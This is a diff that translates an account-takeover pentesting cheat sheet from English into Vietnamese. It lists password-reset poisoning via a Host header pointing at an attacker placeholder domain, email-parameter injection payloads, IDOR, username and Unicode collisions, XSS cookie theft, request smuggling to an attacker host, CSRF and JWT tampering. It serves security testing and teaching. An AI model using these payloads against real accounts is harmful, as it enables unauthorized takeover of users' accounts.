@@ -1,40 +1,40 @@
-# Account Takeover
+# Chiếm quyền tài khoản (Account Takeover)
 
-> Account Takeover (ATO) is a significant threat in the cybersecurity landscape, involving unauthorized access to users' accounts through various attack vectors.
+> Chiếm quyền tài khoản (Account Takeover - ATO) là một mối đe dọa đáng kể trong lĩnh vực an ninh mạng, liên quan đến việc truy cập trái phép vào tài khoản người dùng thông qua nhiều vector tấn công khác nhau.
 
-## Summary
+## Mục lục
 
-* [Password Reset Feature](#password-reset-feature)
-    * [Password Reset Token Leak via Referrer](#password-reset-token-leak-via-referrer)
-    * [Account Takeover Through Password Reset Poisoning](#account-takeover-through-password-reset-poisoning)
-    * [Password Reset via Email Parameter](#password-reset-via-email-parameter)
-    * [IDOR on API Parameters](#idor-on-api-parameters)
-    * [Weak Password Reset Token](#weak-password-reset-token)
-    * [Leaking Password Reset Token](#leaking-password-reset-token)
-    * [Password Reset via Username Collision](#password-reset-via-username-collision)
-    * [Account Takeover Due To Unicode Normalization Issue](#account-takeover-due-to-unicode-normalization-issue)
-* [Account Takeover via Web Vulnerabilities](#account-takeover-via-web-vulnerabilities)
-    * [Account Takeover via Cross Site Scripting](#account-takeover-via-cross-site-scripting)
-    * [Account Takeover via HTTP Request Smuggling](#account-takeover-via-http-request-smuggling)
-    * [Account Takeover via CSRF](#account-takeover-via-csrf)
-* [References](#references)
+* [Tính năng đặt lại mật khẩu](#password-reset-feature)
+    * [Rò rỉ Token đặt lại mật khẩu qua Referrer](#password-reset-token-leak-via-referrer)
+    * [Chiếm quyền tài khoản thông qua đầu độc quá trình đặt lại mật khẩu](#account-takeover-through-password-reset-poisoning)
+    * [Đặt lại mật khẩu qua tham số Email](#password-reset-via-email-parameter)
+    * [IDOR trên các tham số API](#idor-on-api-parameters)
+    * [Token đặt lại mật khẩu yếu](#weak-password-reset-token)
+    * [Rò rỉ Token đặt lại mật khẩu](#leaking-password-reset-token)
+    * [Đặt lại mật khẩu qua xung đột tên người dùng](#password-reset-via-username-collision)
+    * [Chiếm quyền tài khoản do lỗi chuẩn hóa Unicode](#account-takeover-due-to-unicode-normalization-issue)
+* [Chiếm quyền tài khoản qua các lỗ hổng Web](#account-takeover-via-web-vulnerabilities)
+    * [Chiếm quyền tài khoản qua Cross Site Scripting](#account-takeover-via-cross-site-scripting)
+    * [Chiếm quyền tài khoản qua HTTP Request Smuggling](#account-takeover-via-http-request-smuggling)
+    * [Chiếm quyền tài khoản qua CSRF](#account-takeover-via-csrf)
+* [Tài liệu tham khảo](#references)
 
-## Password Reset Feature
+## Tính năng đặt lại mật khẩu
 
-### Password Reset Token Leak via Referrer
+### Rò rỉ Token đặt lại mật khẩu qua Referrer
 
-1. Request password reset to your email address
-2. Click on the password reset link
-3. Don't change password
-4. Click any 3rd party websites(e.g., Facebook, twitter)
-5. Intercept the request in Burp Suite proxy
-6. Check if the referer header is leaking password reset token.
+1. Yêu cầu đặt lại mật khẩu đến địa chỉ email của bạn
+2. Nhấp vào liên kết đặt lại mật khẩu
+3. Không đổi mật khẩu
+4. Nhấp vào bất kỳ website bên thứ 3 nào (ví dụ: Facebook, twitter)
+5. Chặn (intercept) request trong Burp Suite proxy
+6. Kiểm tra xem header referer có bị rò rỉ token đặt lại mật khẩu hay không.
 
-### Account Takeover Through Password Reset Poisoning
+### Chiếm quyền tài khoản thông qua đầu độc quá trình đặt lại mật khẩu
 
-1. Intercept the password reset request in Burp Suite
-2. Add or edit the following headers in Burp Suite : `Host: [ATTACKER.DOMAIN.TLD]`, `X-Forwarded-Host: [ATTACKER.DOMAIN.TLD]`
-3. Forward the request with the modified header
+1. Chặn request đặt lại mật khẩu trong Burp Suite
+2. Thêm hoặc chỉnh sửa các header sau trong Burp Suite: `Host: [ATTACKER.DOMAIN.TLD]`, `X-Forwarded-Host: [ATTACKER.DOMAIN.TLD]`
+3. Chuyển tiếp (forward) request với header đã được chỉnh sửa
 
     ```http
     POST https://example.com/reset.php HTTP/1.1
@@ -43,32 +43,32 @@
     Host: [ATTACKER.DOMAIN.TLD]
     ```
 
-4. Look for a password reset URL based on the *host header* like : `https://[ATTACKER.DOMAIN.TLD]/reset-password.php?token=TOKEN`
+4. Tìm kiếm URL đặt lại mật khẩu dựa trên *host header* như: `https://[ATTACKER.DOMAIN.TLD]/reset-password.php?token=TOKEN`
 
-### Password Reset via Email Parameter
+### Đặt lại mật khẩu qua tham số Email
 
 ```powershell
-# parameter pollution
+# ô nhiễm tham số (parameter pollution)
 email=victim@mail.com&email=hacker@mail.com
 
-# array of emails
+# mảng email
 {"email":["victim@mail.com","hacker@mail.com"]}
 
 # carbon copy
 email=victim@mail.com%0A%0Dcc:hacker@mail.com
 email=victim@mail.com%0A%0Dbcc:hacker@mail.com
 
-# separator
+# ký tự phân tách
 email=victim@mail.com,hacker@mail.com
 email=victim@mail.com%20hacker@mail.com
 email=victim@mail.com|hacker@mail.com
 ```
 
-### IDOR on API Parameters
+### IDOR trên các tham số API
 
-1. Attacker have to login with their account and go to the **Change password** feature.
-2. Start the Burp Suite and Intercept the request
-3. Send it to the repeater tab and edit the parameters : User ID/email
+1. Kẻ tấn công phải đăng nhập bằng tài khoản của họ và vào tính năng **Đổi mật khẩu**.
+2. Khởi động Burp Suite và chặn request
+3. Gửi nó đến tab repeater và chỉnh sửa các tham số: User ID/email
 
     ```powershell
     POST /api/changepass
@@ -76,62 +76,62 @@ email=victim@mail.com|hacker@mail.com
     ("form": {"email":"victim@email.com","password":"securepwd"})
     ```
 
-### Weak Password Reset Token
+### Token đặt lại mật khẩu yếu
 
-The password reset token should be randomly generated and unique every time.
-Try to determine if the token expire or if it's always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.
+Token đặt lại mật khẩu nên được tạo ngẫu nhiên và là duy nhất mỗi lần.
+Hãy thử xác định xem token có hết hạn hay không hoặc nó có luôn giống nhau hay không, trong một số trường hợp thuật toán tạo token yếu và có thể bị đoán được. Các biến sau có thể được thuật toán sử dụng.
 
 * Timestamp
 * UserID
-* Email of User
-* Firstname and Lastname
-* Date of Birth
-* Cryptography
-* Number only
-* Small token sequence (<6 characters between [A-Z,a-z,0-9])
-* Token reuse
-* Token expiration date
+* Email của người dùng
+* Họ và tên
+* Ngày sinh
+* Mật mã học (Cryptography)
+* Chỉ toàn số
+* Chuỗi token ngắn (<6 ký tự trong khoảng [A-Z,a-z,0-9])
+* Tái sử dụng token
+* Ngày hết hạn của token
 
-### Leaking Password Reset Token
+### Rò rỉ Token đặt lại mật khẩu
 
-1. Trigger a password reset request using the API/UI for a specific email e.g: <test@mail.com>
-2. Inspect the server response and check for `resetToken`
-3. Then use the token in an URL like `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`
+1. Kích hoạt một yêu cầu đặt lại mật khẩu thông qua API/UI cho một email cụ thể, ví dụ: <test@mail.com>
+2. Kiểm tra phản hồi từ server và tìm `resetToken`
+3. Sau đó sử dụng token trong một URL như `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`
 
-### Password Reset via Username Collision
+### Đặt lại mật khẩu qua xung đột tên người dùng
 
-1. Register on the system with a username identical to the victim's username, but with white spaces inserted before and/or after the username. e.g: `"admin "`
-2. Request a password reset with your malicious username.
-3. Use the token sent to your email and reset the victim password.
-4. Connect to the victim account with the new password.
+1. Đăng ký vào hệ thống với một username giống hệt username của nạn nhân, nhưng có chèn thêm khoảng trắng trước và/hoặc sau username. Ví dụ: `"admin "`
+2. Yêu cầu đặt lại mật khẩu với username độc hại của bạn.
+3. Sử dụng token được gửi đến email của bạn và đặt lại mật khẩu của nạn nhân.
+4. Kết nối vào tài khoản của nạn nhân bằng mật khẩu mới.
 
-The platform CTFd was vulnerable to this attack.
-See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)
+Nền tảng CTFd đã từng dễ bị tổn thương bởi kiểu tấn công này.
+Xem: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)
 
-### Account Takeover Due To Unicode Normalization Issue
+### Chiếm quyền tài khoản do lỗi chuẩn hóa Unicode
 
-When processing user input involving unicode for case mapping or normalisation, unexpected behavior can occur.  
+Khi xử lý dữ liệu đầu vào của người dùng có liên quan đến unicode để ánh xạ chữ hoa/thường hoặc chuẩn hóa, có thể xảy ra hành vi không mong muốn.
 
-* Victim account: `demo@gmail.com`
-* Attacker account: `demⓞ@gmail.com`
+* Tài khoản nạn nhân: `demo@gmail.com`
+* Tài khoản kẻ tấn công: `demⓞ@gmail.com`
 
-[Unisub - is a tool that can suggest potential unicode characters that may be converted to a given character](https://github.com/tomnomnom/hacks/tree/master/unisub).
+[Unisub - công cụ có thể gợi ý các ký tự unicode tiềm năng có thể được chuyển đổi thành một ký tự nhất định](https://github.com/tomnomnom/hacks/tree/master/unisub).
 
-[Unicode pentester cheatsheet](https://gosecure.github.io/unicode-pentester-cheatsheet/) can be used to find list of suitable unicode characters based on platform.
+[Unicode pentester cheatsheet](https://gosecure.github.io/unicode-pentester-cheatsheet/) có thể được sử dụng để tìm danh sách các ký tự unicode phù hợp dựa trên nền tảng.
 
-## Account Takeover via Web Vulnerabilities
+## Chiếm quyền tài khoản qua các lỗ hổng Web
 
-### Account Takeover via Cross Site Scripting
+### Chiếm quyền tài khoản qua Cross Site Scripting
 
-1. Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain : `*.domain.com`
-2. Leak the current **sessions cookie**
-3. Authenticate as the user using the cookie
+1. Tìm một lỗ hổng XSS bên trong ứng dụng hoặc một subdomain nếu cookie được giới hạn phạm vi (scoped) cho domain cha: `*.domain.com`
+2. Rò rỉ **session cookie** hiện tại
+3. Xác thực với vai trò người dùng bằng cách sử dụng cookie đó
 
-### Account Takeover via HTTP Request Smuggling
+### Chiếm quyền tài khoản qua HTTP Request Smuggling
 
-Refer to **HTTP Request Smuggling** vulnerability page.
+Tham khảo trang lỗ hổng **HTTP Request Smuggling**.
 
-1. Use **smuggler** to detect the type of HTTP Request Smuggling (CL, TE, CL.TE)
+1. Sử dụng **smuggler** để phát hiện loại HTTP Request Smuggling (CL, TE, CL.TE)
 
     ```powershell
     git clone https://github.com/defparam/smuggler.git
@@ -139,14 +139,14 @@ Refer to **HTTP Request Smuggling** vulnerability page.
     python3 smuggler.py -h
     ```
 
-2. Craft a request which will overwrite the `POST / HTTP/1.1` with the following data:
+2. Tạo một request sẽ ghi đè lên `POST / HTTP/1.1` với dữ liệu sau:
 
     ```powershell
     GET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1
     X: 
     ```
 
-3. Final request could look like the following
+3. Request cuối cùng có thể trông giống như sau
 
     ```powershell
     GET /  HTTP/1.1
@@ -161,24 +161,24 @@ Refer to **HTTP Request Smuggling** vulnerability page.
     X: X
     ```
 
-Hackerone reports exploiting this bug
+Các báo cáo trên Hackerone khai thác lỗi này
 
 * <https://hackerone.com/reports/737140>
 * <https://hackerone.com/reports/771666>
 
-### Account Takeover via CSRF
+### Chiếm quyền tài khoản qua CSRF
 
-1. Create a payload for the CSRF, e.g: "HTML form with auto submit for a password change"
-2. Send the payload
+1. Tạo một payload cho CSRF, ví dụ: "Form HTML với tự động submit để đổi mật khẩu"
+2. Gửi payload
 
-### Account Takeover via JWT
+### Chiếm quyền tài khoản qua JWT
 
-JSON Web Token might be used to authenticate a user.
+JSON Web Token có thể được sử dụng để xác thực người dùng.
 
-* Edit the JWT with another User ID / Email
-* Check for weak JWT signature
+* Chỉnh sửa JWT với một User ID / Email khác
+* Kiểm tra chữ ký JWT yếu
 
-## References
+## Tài liệu tham khảo
 
 * [$6,5k + $5k HTTP Request Smuggling mass account takeover - Slack + Zomato - Bug Bounty Reports Explained - August 30, 2020](https://web.archive.org/web/20250701123134/https://www.youtube.com/watch?v=gzM4wWA7RFo)
 * [10 Password Reset Flaws - Anugrah SR - September 16, 2020](https://web.archive.org/web/20250626114943/https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
